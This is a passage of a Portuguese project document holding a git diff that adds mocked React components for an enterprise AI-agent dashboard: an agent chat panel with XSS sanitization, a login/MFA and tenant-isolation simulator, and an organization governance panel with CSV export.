@@ -2,12 +2,622 @@
 
 > Documento principal: [2026-10-30-loc-web-001-frontend-mockado.md](2026-10-30-loc-web-001-frontend-mockado.md) · Especificação: [lote-2026-10-30-frontend-mockado-web-001.md](../planejamento-ia/lote-2026-10-30-frontend-mockado-web-001.md)
 
-## Commit `4519ed595a1a2ed6bb5d76872b46c62534e864dc`
-
-- **Mensagem:** `feat(web): implementa fundacao navegavel do frontend com dados mockados (LOC-WEB-001)`
-- **Base:** `f322f4b1698f94ae276fdb8838137cd6b7e9cef8`
+## Diff consolidado (`f322f4b1698f94ae276fdb8838137cd6b7e9cef8..HEAD` em `apps/web`)
 
 ```diff
+diff --git a/apps/web/app/components/AgentChatAndSecurityPanel.tsx b/apps/web/app/components/AgentChatAndSecurityPanel.tsx
+new file mode 100644
+index 0000000..6c4d0ea
+--- /dev/null
++++ b/apps/web/app/components/AgentChatAndSecurityPanel.tsx
+@@ -0,0 +1,339 @@
++"use client";
++
++import { useState } from "react";
++import { MOCK_AGENT_CONVERSATIONS, type MockChatMessage } from "../../lib/mock-enterprise-data.ts";
++import {
++  registerIdempotentMutation,
++  sanitizeAgentMessageContent,
++} from "../../lib/mock-security.ts";
++
++export function AgentChatAndSecurityPanel() {
++  const [selectedAgentId, setSelectedAgentId] = useState<string>(
++    MOCK_AGENT_CONVERSATIONS[0]?.agentId ?? "agt-fin-01",
++  );
++  const [draftPrompt, setDraftPrompt] = useState<string>("");
++  const [customMessages, setCustomMessages] = useState<readonly MockChatMessage[]>([]);
++  const [idempotencyKeys, setIdempotencyKeys] = useState<readonly string[]>([]);
++  const [lastIdempotencyNotice, setLastIdempotencyNotice] = useState<string | null>(null);
++  const [revealedBlockedUrls, setRevealedBlockedUrls] = useState<readonly string[]>([]);
++
++  const activeConversation =
++    MOCK_AGENT_CONVERSATIONS.find((c) => c.agentId === selectedAgentId) ??
++    MOCK_AGENT_CONVERSATIONS[0];
++
++  const messages: readonly MockChatMessage[] = activeConversation
++    ? [...activeConversation.messages, ...customMessages]
++    : customMessages;
++
++  function handleSendPrompt(promptText: string): void {
++    const trimmed = promptText.trim();
++    if (!trimmed || !activeConversation) {
++      return;
++    }
++
++    const check = registerIdempotentMutation(
++      idempotencyKeys,
++      activeConversation.agentId,
++      trimmed,
++      "send-chat-job",
++    );
++
++    if (!check.allowed) {
++      setLastIdempotencyNotice(
++        `Mutação duplicada bloqueada por Idempotency-Key (${check.idempotencyKey}) — WEB-002.`,
++      );
++      return;
++    }
++
++    setIdempotencyKeys(check.updatedKeys);
++    setLastIdempotencyNotice(`Job criado com Idempotency-Key: ${check.idempotencyKey}`);
++
++    const userMsg: MockChatMessage = {
++      id: `msg-usr-${String(customMessages.length + 100)}`,
++      sender: "user",
++      authorLabel: "Você (Sessão Mockada)",
++      timestampLabel: "agora",
++      rawContent: trimmed,
++      toolSteps: [],
++      citations: [],
++      costTokens: 95,
++    };
++
++    const agentReply: MockChatMessage = {
++      id: `msg-agt-${String(customMessages.length + 101)}`,
++      sender: "agent",
++      authorLabel: activeConversation.agentName,
++      timestampLabel: "agora (stream simulado)",
++      rawContent:
++        `Recebi sua solicitação: "${trimmed}".\n` +
++        "Consultei os índices autorizados do tenant e gerei o parecer preliminar sem executar mutações externas sem aprovação.",
++      toolSteps: [
++        {
++          stepId: `stp-sim-${String(customMessages.length + 1)}`,
++          toolName: "tenant_rag.hybrid_search",
++          policyDecision: "ALLOW",
++          durationMs: 54,
++          summary: "Busca vetorial + textual restrita ao tenant_id ativo",
++        },
++      ],
++      citations: [
++        {
++          documentId: "doc-rag-01",
++          documentTitle: "Política de Alçadas e Pagamentos Industriais v4.2.pdf",
++          sectionLabel: "Seção 1.1 — Escopo de operação",
++        },
++      ],
++      costTokens: 610,
++    };
++
++    setCustomMessages((prev) => [...prev, userMsg, agentReply]);
++    setDraftPrompt("");
++  }
++
++  return (
++    <section className="panel-card" aria-labelledby="chat-security-heading">
++      <div className="panel-header">
++        <div>
++          <h2 id="chat-security-heading">
++            Conversas com Agentes, Execução de Ferramentas &amp; Sanitização (WEB-004 + WEB-008)
++          </h2>
++          <p
++            style={{
++              margin: "0.25rem 0 0",
++              fontSize: "0.86rem",
++              color: "var(--text-secondary)",
++            }}
++          >
++            Histórico com passos do Tool Gateway, citações do RAG, chave de idempotência contra
++            duplo clique e neutralização de XSS/imagens remotas.
++          </p>
++        </div>
++
++        <div className="control-group">
++          <label htmlFor="chat-agent-select">Agente em conversa</label>
++          <select
++            id="chat-agent-select"
++            className="control-select"
++            value={selectedAgentId}
++            onChange={(e) => {
++              setSelectedAgentId(e.target.value);
++              setCustomMessages([]);
++              setLastIdempotencyNotice(null);
++            }}
++          >
++            {MOCK_AGENT_CONVERSATIONS.map((conv) => (
++              <option key={conv.agentId} value={conv.agentId}>
++                {conv.agentName} — {conv.departmentName} ({conv.modelName})
++              </option>
++            ))}
++          </select>
++        </div>
++      </div>
++
++      <ul className="item-list" aria-label="Mensagens da conversa com o agente">
++        {messages.map((msg) => {
++          const sanitized = sanitizeAgentMessageContent(msg.rawContent);
++
++          return (
++            <li key={msg.id} className="item-card">
++              <div
++                style={{
++                  display: "flex",
++                  justifyContent: "space-between",
++                  alignItems: "center",
++                  gap: "0.5rem",
++                }}
++              >
++                <div>
++                  <strong>{msg.authorLabel}</strong>{" "}
++                  <span
++                    style={{
++                      fontSize: "0.78rem",
++                      color: "var(--text-secondary)",
++                    }}
++                  >
++                    ({msg.timestampLabel})
++                  </span>
++                </div>
++                <span className="demo-badge demo-badge--info">{msg.costTokens} tokens</span>
++              </div>
++
++              {sanitized.blockedXssCount > 0 ? (
++                <div
++                  role="alert"
++                  className="demo-badge demo-badge--danger"
++                  style={{ alignSelf: "flex-start" }}
++                >
++                  WEB-008: {sanitized.blockedXssCount} payload(s) XSS/script neutralizado(s) antes
++                  da renderização
++                </div>
++              ) : null}
++
++              <div
++                style={{
++                  display: "flex",
++                  flexDirection: "column",
++                  gap: "0.35rem",
++                  marginTop: "0.25rem",
++                }}
++              >
++                {sanitized.safeSegments.map((seg, idx) => {
++                  const segKey = `${msg.id}-seg-${String(idx)}`;
++                  if (seg.kind === "code") {
++                    return (
++                      <code key={segKey} className="code-preview">
++                        {seg.content}
++                      </code>
++                    );
++                  }
++                  if (seg.kind === "blocked_xss") {
++                    return (
++                      <div key={segKey} className="code-preview">
++                        [Trecho bloqueado pelo sanitizador WEB-008: {seg.content}]
++                      </div>
++                    );
++                  }
++                  if (seg.kind === "blocked_remote_image") {
++                    return (
++                      <div
++                        key={segKey}
++                        className="code-preview"
++                        style={{
++                          display: "flex",
++                          flexWrap: "wrap",
++                          justifyContent: "space-between",
++                          alignItems: "center",
++                          gap: "0.5rem",
++                        }}
++                      >
++                        <span>
++                          Imagem remota bloqueada automaticamente (evita exfiltração por query
++                          string).
++                        </span>
++                        <button
++                          type="button"
++                          className="btn btn--secondary"
++                          onClick={() => {
++                            setRevealedBlockedUrls((prev) =>
++                              prev.includes(seg.content) ? prev : [...prev, seg.content],
++                            );
++                          }}
++                        >
++                          Inspecionar URL bloqueada (sem carregar imagem)
++                        </button>
++                        {revealedBlockedUrls.includes(seg.content) ? (
++                          <div style={{ width: "100%", fontSize: "0.75rem" }}>
++                            marcador retido: {seg.content}
++                          </div>
++                        ) : null}
++                      </div>
++                    );
++                  }
++                  return (
++                    <p key={segKey} style={{ margin: 0, fontSize: "0.88rem" }}>
++                      {seg.content}
++                    </p>
++                  );
++                })}
++              </div>
++
++              {msg.toolSteps.length > 0 ? (
++                <div
++                  style={{
++                    marginTop: "0.5rem",
++                    paddingTop: "0.5rem",
++                    borderTop: "1px solid var(--border-subtle)",
++                    fontSize: "0.8rem",
++                  }}
++                >
++                  <strong>Ferramentas acionadas via Tool Gateway:</strong>
++                  <ul style={{ margin: "0.35rem 0 0", paddingLeft: "1.2rem" }}>
++                    {msg.toolSteps.map((step) => (
++                      <li key={step.stepId}>
++                        <code>{step.toolName}</code> — Decisão:{" "}
++                        <strong>{step.policyDecision}</strong> ({step.durationMs}
++                        ms) · {step.summary}
++                      </li>
++                    ))}
++                  </ul>
++                </div>
++              ) : null}
++
++              {msg.citations.length > 0 ? (
++                <div style={{ fontSize: "0.78rem", color: "var(--text-secondary)" }}>
++                  <strong>Citações autorizadas (RAG):</strong>{" "}
++                  {msg.citations.map((cit) => (
++                    <span key={cit.documentId} style={{ marginRight: "0.75rem" }}>
++                      [{cit.documentTitle} — {cit.sectionLabel}]
++                    </span>
++                  ))}
++                </div>
++              ) : null}
++            </li>
++          );
++        })}
++      </ul>
++
++      <div
++        style={{
++          marginTop: "1rem",
++          paddingTop: "1rem",
++          borderTop: "1px solid var(--border-subtle)",
++          display: "flex",
++          flexWrap: "wrap",
++          gap: "0.75rem",
++          alignItems: "flex-end",
++        }}
++      >
++        <div className="control-group" style={{ flex: "1 1 320px" }}>
++          <label htmlFor="agent-chat-input">
++            Enviar instrução ao agente (simula criação de job com Idempotency-Key)
++          </label>
++          <input
++            id="agent-chat-input"
++            type="text"
++            className="control-input"
++            placeholder="Ex.: Verificar divergências fiscais do lote de outubro..."
++            value={draftPrompt}
++            onChange={(e) => {
++              setDraftPrompt(e.target.value);
++            }}
++          />
++        </div>
++
++        <button
++          type="button"
++          className="btn btn--approve"
++          onClick={() => {
++            handleSendPrompt(draftPrompt);
++          }}
++        >
++          Enviar mensagem ao agente
++        </button>
++
++        <button
++          type="button"
++          className="btn btn--secondary"
++          onClick={() => {
++            handleSendPrompt("Teste de repetição idempotente para o lote BR-442");
++          }}
++        >
++          Testar proteção de duplo clique (Idempotência WEB-002)
++        </button>
++      </div>
++
++      {lastIdempotencyNotice ? (
++        <p
++          role="status"
++          style={{
++            marginTop: "0.6rem",
++            fontSize: "0.82rem",
++            color: "var(--status-warn-text)",
++          }}
++        >
++          {lastIdempotencyNotice}
++        </p>
++      ) : null}
++    </section>
++  );
++}
+diff --git a/apps/web/app/components/AuthAndMultiOrgPanel.tsx b/apps/web/app/components/AuthAndMultiOrgPanel.tsx
+new file mode 100644
+index 0000000..dcd2cc9
+--- /dev/null
++++ b/apps/web/app/components/AuthAndMultiOrgPanel.tsx
+@@ -0,0 +1,262 @@
++"use client";
++
++import { useState } from "react";
++import { MOCK_SESSION_ACTORS, resolveTenantRouteAccess } from "../../lib/mock-enterprise-data.ts";
++
++type AuthStepView = "login" | "mfa" | "forgot_password" | "verify_email" | "org_selector";
++
++export function AuthAndMultiOrgPanel() {
++  const [authStep, setAuthStep] = useState<AuthStepView>("org_selector");
++  const [actorId, setActorId] = useState<string>(MOCK_SESSION_ACTORS[0]?.id ?? "usr-marina-01");
++  const [requestedSlug, setRequestedSlug] = useState<string>("aurora-industrial");
++  const [totpCode, setTotpCode] = useState<string>("482910");
++  const [authNotice, setAuthNotice] = useState<string | null>(null);
++
++  const activeActor =
++    MOCK_SESSION_ACTORS.find((a) => a.id === actorId) ?? MOCK_SESSION_ACTORS[0] ?? null;
++
++  const routeResolution = resolveTenantRouteAccess(activeActor, requestedSlug);
++
++  return (
++    <section className="panel-card" aria-labelledby="auth-multiorg-heading">
++      <div className="panel-header">
++        <div>
++          <h2 id="auth-multiorg-heading">
++            Autenticação, MFA &amp; Isolamento Multi-Organização (WEB-001 + WEB-002)
++          </h2>
++          <p
++            style={{
++              margin: "0.25rem 0 0",
++              fontSize: "0.86rem",
++              color: "var(--text-secondary)",
++            }}
++          >
++            Simulação das rotas <code>/login</code>, <code>/mfa</code>,{" "}
++            <code>/forgot-password</code>, <code>/verify-email</code> e <code>/orgs/[orgSlug]</code>
++            . Nenhum token é gravado em <code>localStorage</code> ou <code>sessionStorage</code>.
++          </p>
++        </div>
++
++        <div className="action-row" style={{ marginTop: 0 }}>
++          <button
++            type="button"
++            className="btn btn--secondary"
++            onClick={() => {
++              setAuthStep("login");
++            }}
++          >
++            /login
++          </button>
++          <button
++            type="button"
++            className="btn btn--secondary"
++            onClick={() => {
++              setAuthStep("mfa");
++            }}
++          >
++            /mfa
++          </button>
++          <button
++            type="button"
++            className="btn btn--secondary"
++            onClick={() => {
++              setAuthStep("forgot_password");
++            }}
++          >
++            /forgot-password
++          </button>
++          <button
++            type="button"
++            className="btn btn--secondary"
++            onClick={() => {
++              setAuthStep("verify_email");
++            }}
++          >
++            /verify-email
++          </button>
++          <button
++            type="button"
++            className="btn btn--approve"
++            onClick={() => {
++              setAuthStep("org_selector");
++            }}
++          >
++            /orgs/[orgSlug] (Teste A/B 404)
++          </button>
++        </div>
++      </div>
++
++      {authStep === "login" ? (
++        <div className="item-card">
++          <h3>Simulação de /login (Credenciais Opacas + Redirecionamento MFA)</h3>
++          <p style={{ fontSize: "0.85rem", color: "var(--text-secondary)" }}>
++            Na arquitetura real (ADR-016), o Control Plane emite cookie{" "}
++            <code>HttpOnly; Secure; SameSite=Lax</code> após o segundo fator.
++          </p>
++          <div className="action-row">
++            <button
++              type="button"
++              className="btn btn--approve"
++              onClick={() => {
++                setAuthNotice(
++                  "Credenciais primárias validadas; avançando para desafio TOTP (/mfa).",
++                );
++                setAuthStep("mfa");
++              }}
++            >
++              Autenticar e avançar para /mfa
++            </button>
++          </div>
++        </div>
++      ) : null}
++
++      {authStep === "mfa" ? (
++        <div className="item-card">
++          <h3>Simulação de /mfa (Segundo Fator TOTP Obrigatório)</h3>
++          <div className="control-group" style={{ maxWidth: "240px" }}>
++            <label htmlFor="mfa-totp-input">Código TOTP de 6 dígitos</label>
++            <input
++              id="mfa-totp-input"
++              type="text"
++              className="control-input"
++              value={totpCode}
++              onChange={(e) => {
++                setTotpCode(e.target.value);
++              }}
++            />
++          </div>
++          <div className="action-row">
++            <button
++              type="button"
++              className="btn btn--approve"
++              onClick={() => {
++                setAuthNotice(
++                  `Desafio MFA (${totpCode}) confirmado. Sessão ativa sem qualquer token em localStorage.`,
++                );
++                setAuthStep("org_selector");
++              }}
++            >
++              Confirmar MFA e abrir /orgs
++            </button>
++          </div>
++        </div>
++      ) : null}
++
++      {authStep === "forgot_password" ? (
++        <div className="item-card">
++          <h3>Simulação de /forgot-password</h3>
++          <p style={{ fontSize: "0.85rem", color: "var(--text-secondary)" }}>
++            Resposta idêntica para e-mails cadastrados ou inexistentes (evita enumeração de contas).
++          </p>
++          <button
++            type="button"
++            className="btn btn--secondary"
++            onClick={() => {
++              setAuthNotice("Se o endereço existir, um link temporário de uso único foi enviado.");
++            }}
++          >
++            Simular disparo de recuperação
++          </button>
++        </div>
++      ) : null}
++
++      {authStep === "verify_email" ? (
++        <div className="item-card">
++          <h3>Simulação de /verify-email</h3>
++          <p style={{ fontSize: "0.85rem", color: "var(--text-secondary)" }}>
++            Confirmação de endereço de e-mail corporativo antes de ativar memberships.
++          </p>
++        </div>
++      ) : null}
++
++      {authStep === "org_selector" ? (
++        <div className="two-col-grid">
++          <div className="item-card">
++            <h3>1. Selecionar Sessão e Rota Solicitada</h3>
++            <div className="control-group">
++              <label htmlFor="session-actor-select">Usuário autenticado na sessão</label>
++              <select
++                id="session-actor-select"
++                className="control-select"
++                value={actorId}
++                onChange={(e) => {
++                  setActorId(e.target.value);
++                }}
++              >
++                {MOCK_SESSION_ACTORS.map((actor) => (
++                  <option key={actor.id} value={actor.id}>
++                    {actor.displayName} (Orgs: {actor.authorizedOrgSlugs.join(", ")})
++                  </option>
++                ))}
++              </select>
++            </div>
++
++            <div className="control-group" style={{ marginTop: "0.6rem" }}>
++              <label htmlFor="target-org-slug-select">
++                Rota solicitada: <code>/orgs/[orgSlug]</code>
++              </label>
++              <select
++                id="target-org-slug-select"
++                className="control-select"
++                value={requestedSlug}
++                onChange={(e) => {
++                  setRequestedSlug(e.target.value);
++                }}
++              >
++                <option value="aurora-industrial">/orgs/aurora-industrial (Tenant A)</option>
++                <option value="vereda-logistica">/orgs/vereda-logistica (Tenant B)</option>
++                <option value="titan-defesa">
++                  /orgs/titan-defesa (Tenant C — Não pertence à sessão → 404)
++                </option>
++              </select>
++            </div>
++          </div>
++
++          <div className="item-card">
++            <h3>2. Resultado da Guarda de Isolamento A/B (WEB-001 AC-2)</h3>
++            <div className="org-meta-row">
++              <span
++                className={
++                  routeResolution.allowed
++                    ? "demo-badge demo-badge--ok"
++                    : "demo-badge demo-badge--danger"
++                }
++              >
++                HTTP {routeResolution.httpStatus}
++              </span>
++              <code>/orgs/{requestedSlug}</code>
++            </div>
++
++            <p style={{ margin: "0.4rem 0", fontSize: "0.86rem" }}>{routeResolution.safeMessage}</p>
++
++            {routeResolution.organization ? (
++              <div className="code-preview">
++                Organização resolvida: <strong>{routeResolution.organization.displayName}</strong> (
++                {routeResolution.organization.legalName}) · Estado:{" "}
++                {routeResolution.organization.tenantState}
++              </div>
++            ) : (
++              <div className="code-preview">
++                Nenhum dado de <code>{requestedSlug}</code> foi retornado ao cliente (404 seguro
++                contra enumeração entre tenants).
++              </div>
++            )}
++          </div>
++        </div>
++      ) : null}
++
++      {authNotice ? (
++        <p
++          role="status"
++          style={{
++            marginTop: "0.75rem",
++            fontSize: "0.82rem",
++            color: "var(--status-ok-text)",
++          }}
++        >
++          {authNotice}
++        </p>
++      ) : null}
++    </section>
++  );
++}
 diff --git a/apps/web/app/components/BuildingFloorMap.tsx b/apps/web/app/components/BuildingFloorMap.tsx
 new file mode 100644
 index 0000000..f3261a2
@@ -303,21 +913,30 @@ index 0000000..f3261a2
 +}
 diff --git a/apps/web/app/components/DashboardClientShell.tsx b/apps/web/app/components/DashboardClientShell.tsx
 new file mode 100644
-index 0000000..e783558
+index 0000000..8c3ccb7
 --- /dev/null
 +++ b/apps/web/app/components/DashboardClientShell.tsx
-@@ -0,0 +1,371 @@
+@@ -0,0 +1,448 @@
 +"use client";
 +
 +import { useState } from "react";
 +import { deriveDashboardViewModel, listMockOrganizations } from "../../lib/mock-selectors.ts";
 +import type { DemoStateVariant } from "../../lib/mock-types.ts";
++import { AgentChatAndSecurityPanel } from "./AgentChatAndSecurityPanel.tsx";
++import { AuthAndMultiOrgPanel } from "./AuthAndMultiOrgPanel.tsx";
 +import { BuildingFloorMap } from "./BuildingFloorMap.tsx";
 +import { OperationsPanels, type SimulatedApprovalDecision } from "./OperationsPanels.tsx";
++import { OrganizationGovernancePanel } from "./OrganizationGovernancePanel.tsx";
++import { PlatformBackofficePanel } from "./PlatformBackofficePanel.tsx";
 +
-+type NavigationSection = "overview" | "building" | "operations";
++export type NavigationSection =
++  "overview" | "building" | "operations" | "chat" | "governance" | "auth" | "platform";
 +
-+export function DashboardClientShell() {
++export interface DashboardClientShellProps {
++  readonly initialSection?: NavigationSection;
++}
++
++export function DashboardClientShell({ initialSection = "overview" }: DashboardClientShellProps) {
 +  const organizations = listMockOrganizations();
 +  const defaultOrgSlug = organizations[0]?.slug ?? "aurora-industrial";
 +
@@ -325,7 +944,7 @@ index 0000000..e783558
 +  const [variant, setVariant] = useState<DemoStateVariant>("ready");
 +  const [selectedFloorId, setSelectedFloorId] = useState<string | undefined>(undefined);
 +  const [agentQuery, setAgentQuery] = useState<string>("");
-+  const [activeSection, setActiveSection] = useState<NavigationSection>("overview");
++  const [activeSection, setActiveSection] = useState<NavigationSection>(initialSection);
 +  const [decisions, setDecisions] = useState<readonly SimulatedApprovalDecision[]>([]);
 +
 +  const viewModel = deriveDashboardViewModel({
@@ -363,7 +982,7 @@ index 0000000..e783558
 +          <strong>MODO DEMONSTRAÇÃO (MOCK LOCAL)</strong> — {viewModel.demoBannerText}
 +        </div>
 +        <span className="demo-badge demo-badge--warn">
-+          Sem rede · Sem autenticação real · LOC-WEB-001
++          Sem rede · Sem autenticação real · EP-10 Mockado
 +        </span>
 +      </aside>
 +
@@ -372,7 +991,7 @@ index 0000000..e783558
 +          <div className="brand-block">
 +            <span className="brand-title">NÚCLEOS ENTERPRISE</span>
 +            <span className="brand-subtitle">
-+              Shell Multi-Organização &amp; Escritório de Agentes (Fixtures TypeScript)
++              Interface Web Completa com Dados Mockados (WEB-001..004, WEB-008, WEB-009)
 +            </span>
 +          </div>
 +
@@ -426,7 +1045,7 @@ index 0000000..e783558
 +                setActiveSection("overview");
 +              }}
 +            >
-+              Visão Completa (Dashboard + Edifício)
++              Visão Completa
 +            </button>
 +          </li>
 +          <li>
@@ -438,7 +1057,7 @@ index 0000000..e783558
 +                setActiveSection("building");
 +              }}
 +            >
-+              Edifício &amp; Departamentos
++              Departamentos &amp; Agentes
 +            </button>
 +          </li>
 +          <li>
@@ -451,6 +1070,54 @@ index 0000000..e783558
 +              }}
 +            >
 +              Aprovações, Filas &amp; Orçamento
++            </button>
++          </li>
++          <li>
++            <button
++              type="button"
++              className="nav-button"
++              aria-current={activeSection === "chat" ? "page" : undefined}
++              onClick={() => {
++                setActiveSection("chat");
++              }}
++            >
++              Chat Agentes &amp; XSS (WEB-004/008)
++            </button>
++          </li>
++          <li>
++            <button
++              type="button"
++              className="nav-button"
++              aria-current={activeSection === "governance" ? "page" : undefined}
++              onClick={() => {
++                setActiveSection("governance");
++              }}
++            >
++              Governança &amp; CSV (WEB-003)
++            </button>
++          </li>
++          <li>
++            <button
++              type="button"
++              className="nav-button"
++              aria-current={activeSection === "auth" ? "page" : undefined}
++              onClick={() => {
++                setActiveSection("auth");
++              }}
++            >
++              Login, MFA &amp; Multi-Org (WEB-001)
++            </button>
++          </li>
++          <li>
++            <button
++              type="button"
++              className="nav-button"
++              aria-current={activeSection === "platform" ? "page" : undefined}
++              onClick={() => {
++                setActiveSection("platform");
++              }}
++            >
++              Backoffice /platform (WEB-009)
 +            </button>
 +          </li>
 +        </ul>
@@ -595,9 +1262,9 @@ index 0000000..e783558
 +              </h2>
 +              <div className="kpi-grid">
 +                <div className="kpi-card">
-+                  <span className="kpi-card__label">Andares / Departamentos</span>
++                  <span className="kpi-card__label">Departamentos Ativos</span>
 +                  <span className="kpi-card__value">{viewModel.metrics.totalFloors}</span>
-+                  <span className="kpi-card__detail">Módulos contratados no edifício</span>
++                  <span className="kpi-card__detail">Módulos contratados na organização</span>
 +                </div>
 +
 +                <div className="kpi-card">
@@ -630,7 +1297,7 @@ index 0000000..e783558
 +                  <span className="kpi-card__detail">
 +                    R$ {viewModel.metrics.totalBudget.spentBrl} / R${" "}
 +                    {viewModel.metrics.totalBudget.limitBrl} (
-+                    {viewModel.metrics.budgetAlertFloorsCount} andar(es) em alerta)
++                    {viewModel.metrics.budgetAlertFloorsCount} depto(s) em alerta)
 +                  </span>
 +                </div>
 +              </div>
@@ -664,16 +1331,36 @@ index 0000000..e783558
 +                onDecideApproval={handleDecideApproval}
 +              />
 +            ) : null}
++
++            {activeSection === "overview" || activeSection === "chat" ? (
++              <AgentChatAndSecurityPanel />
++            ) : null}
++
++            {activeSection === "overview" || activeSection === "governance" ? (
++              <OrganizationGovernancePanel
++                orgSlug={viewModel.organization.slug}
++                activeRole={viewModel.organization.activeRole}
++                canMutateGovernance={viewModel.organization.canDecideApprovals}
++              />
++            ) : null}
++
++            {activeSection === "overview" || activeSection === "auth" ? (
++              <AuthAndMultiOrgPanel />
++            ) : null}
++
++            {activeSection === "overview" || activeSection === "platform" ? (
++              <PlatformBackofficePanel />
++            ) : null}
 +          </>
 +        ) : null}
 +      </main>
 +
 +      <footer className="shell-footer">
-+        <strong>NÚCLEOS Enterprise — Fundação Visual Mockada (LOC-WEB-001)</strong>
++        <strong>NÚCLEOS Enterprise — Interface Web Mockada (LOC-WEB-001 / EP-10 sem 3D)</strong>
 +        {" · "}Esta entrega utiliza exclusivamente fixtures TypeScript locais para validar
-+        navegação, acessibilidade e hierarquia visual. Os tickets canônicos <code>WEB-001</code>,{" "}
-+        <code>WEB-003</code> e <code>WEB-005</code> permanecem abertos aguardando integração com o
-+        backend.
++        navegação, acessibilidade, fluxos de autenticação/multi-org, chat com sanitização XSS,
++        governança/CSV e backoffice. Os tickets canônicos do EP-10 permanecem abertos aguardando
++        integração com o backend; a cena 3D (<code>WEB-005..007</code>) fica para sessão futura.
 +      </footer>
 +    </div>
 +  );
@@ -1048,14 +1735,595 @@ index 0000000..2b8fffa
 +    </div>
 +  );
 +}
+diff --git a/apps/web/app/components/OrganizationGovernancePanel.tsx b/apps/web/app/components/OrganizationGovernancePanel.tsx
+new file mode 100644
+index 0000000..aa32427
+--- /dev/null
++++ b/apps/web/app/components/OrganizationGovernancePanel.tsx
+@@ -0,0 +1,264 @@
++"use client";
++
++import { useState } from "react";
++import {
++  generateOrganizationUsageCsv,
++  MOCK_ENTITLEMENTS,
++  MOCK_INTEGRATIONS,
++  MOCK_ORG_MEMBERS,
++  MOCK_RAG_DOCUMENTS,
++} from "../../lib/mock-enterprise-data.ts";
++import type { UserRole } from "../../lib/mock-types.ts";
++
++export interface OrganizationGovernancePanelProps {
++  readonly orgSlug: string;
++  readonly activeRole: UserRole;
++  readonly canMutateGovernance: boolean;
++}
++
++export function OrganizationGovernancePanel({
++  orgSlug,
++  activeRole,
++  canMutateGovernance,
++}: OrganizationGovernancePanelProps) {
++  const [showCsvPreview, setShowCsvPreview] = useState<boolean>(false);
++  const [invitedEmailNotice, setInvitedEmailNotice] = useState<string | null>(null);
++
++  const csvContent = generateOrganizationUsageCsv(orgSlug);
++
++  return (
++    <section className="panel-card" aria-labelledby="org-governance-heading">
++      <div className="panel-header">
++        <div>
++          <h2 id="org-governance-heading">
++            Gestão da Organização: Membros, Módulos, Integrações, Documentos RAG &amp; Exportação
++            CSV (WEB-003)
++          </h2>
++          <p
++            style={{
++              margin: "0.25rem 0 0",
++              fontSize: "0.86rem",
++              color: "var(--text-secondary)",
++            }}
++          >
++            Ações de mutação respeitam o papel ativo ({activeRole}). Quando o papel é{" "}
++            <code>viewer</code>, convites e alterações ficam ocultos.
++          </p>
++        </div>
++
++        <button
++          type="button"
++          className="btn btn--secondary"
++          onClick={() => {
++            setShowCsvPreview((prev) => !prev);
++          }}
++        >
++          {showCsvPreview
++            ? "Ocultar CSV de Uso (AIG-003)"
++            : "Exportar / Visualizar CSV de Uso de IA"}
++        </button>
++      </div>
++
++      {showCsvPreview ? (
++        <div style={{ marginBottom: "1.25rem" }}>
++          <strong style={{ fontSize: "0.84rem" }}>
++            Relatório CSV de Consumo de IA ({orgSlug}.csv — protegido contra CSV Injection):
++          </strong>
++          <pre className="code-preview" style={{ marginTop: "0.4rem" }}>
++            {csvContent}
++          </pre>
++        </div>
++      ) : null}
++
++      <div className="two-col-grid">
++        <div className="item-card">
++          <div className="panel-header" style={{ marginBottom: "0.5rem" }}>
++            <h3>Membros &amp; Papéis ({MOCK_ORG_MEMBERS.length})</h3>
++            {canMutateGovernance ? (
++              <button
++                type="button"
++                className="btn btn--approve"
++                onClick={() => {
++                  setInvitedEmailNotice(
++                    "Convite simulado registrado para novo.operador@aurora-demo.example (sem envio de rede).",
++                  );
++                }}
++              >
++                Simular Convite de Membro
++              </button>
++            ) : (
++              <span className="demo-badge demo-badge--info">
++                Papel {activeRole}: mutação oculta (WEB-003 AC-1)
++              </span>
++            )}
++          </div>
++
++          {invitedEmailNotice ? (
++            <p
++              role="status"
++              style={{
++                fontSize: "0.8rem",
++                color: "var(--status-ok-text)",
++                margin: "0 0 0.5rem",
++              }}
++            >
++              {invitedEmailNotice}
++            </p>
++          ) : null}
++
++          <ul className="item-list">
++            {MOCK_ORG_MEMBERS.map((member) => (
++              <li
++                key={member.id}
++                style={{
++                  display: "flex",
++                  justifyContent: "space-between",
++                  alignItems: "center",
++                  fontSize: "0.84rem",
++                  paddingBottom: "0.4rem",
++                  borderBottom: "1px solid var(--border-subtle)",
++                }}
++              >
++                <div>
++                  <strong>{member.name}</strong> ({member.email})
++                  <div
++                    style={{
++                      fontSize: "0.76rem",
++                      color: "var(--text-secondary)",
++                    }}
++                  >
++                    MFA: {member.mfaEnabled ? "Ativo" : "Pendente"} · {member.lastSeenLabel}
++                  </div>
++                </div>
++                <span className="demo-badge demo-badge--info">{member.role}</span>
++              </li>
++            ))}
++          </ul>
++        </div>
++
++        <div className="item-card">
++          <h3>Módulos Contratados / Entitlements (Somente Leitura)</h3>
++          <ul className="item-list">
++            {MOCK_ENTITLEMENTS.map((mod) => (
++              <li
++                key={mod.moduleCode}
++                style={{
++                  display: "flex",
++                  justifyContent: "space-between",
++                  alignItems: "center",
++                  fontSize: "0.84rem",
++                  paddingBottom: "0.4rem",
++                  borderBottom: "1px solid var(--border-subtle)",
++                }}
++              >
++                <div>
++                  <code>{mod.moduleCode}</code> · <strong>{mod.name}</strong>
++                  <div
++                    style={{
++                      fontSize: "0.76rem",
++                      color: "var(--text-secondary)",
++                    }}
++                  >
++                    Agentes: {mod.activeAgents}/{mod.maxAgents} · Cota:{" "}
++                    {mod.monthlyQuotaTokens.toLocaleString("pt-BR")} tokens
++                  </div>
++                </div>
++                <span className="demo-badge demo-badge--ok">{mod.status}</span>
++              </li>
++            ))}
++          </ul>
++        </div>
++
++        <div className="item-card">
++          <h3>Integrações &amp; Conectores (Metadados sem Segredos)</h3>
++          <ul className="item-list">
++            {MOCK_INTEGRATIONS.map((conn) => (
++              <li
++                key={conn.id}
++                style={{
++                  fontSize: "0.84rem",
++                  paddingBottom: "0.4rem",
++                  borderBottom: "1px solid var(--border-subtle)",
++                }}
++              >
++                <div
++                  style={{
++                    display: "flex",
++                    justifyContent: "space-between",
++                    alignItems: "center",
++                  }}
++                >
++                  <strong>{conn.name}</strong>
++                  <span
++                    className={
++                      conn.status === "HEALTHY"
++                        ? "demo-badge demo-badge--ok"
++                        : "demo-badge demo-badge--danger"
++                    }
++                  >
++                    {conn.status}
++                  </span>
++                </div>
++                <div
++                  style={{
++                    fontSize: "0.76rem",
++                    color: "var(--text-secondary)",
++                  }}
++                >
++                  Egress allowlist: <code>{conn.egressDomain}</code> · Cofre:{" "}
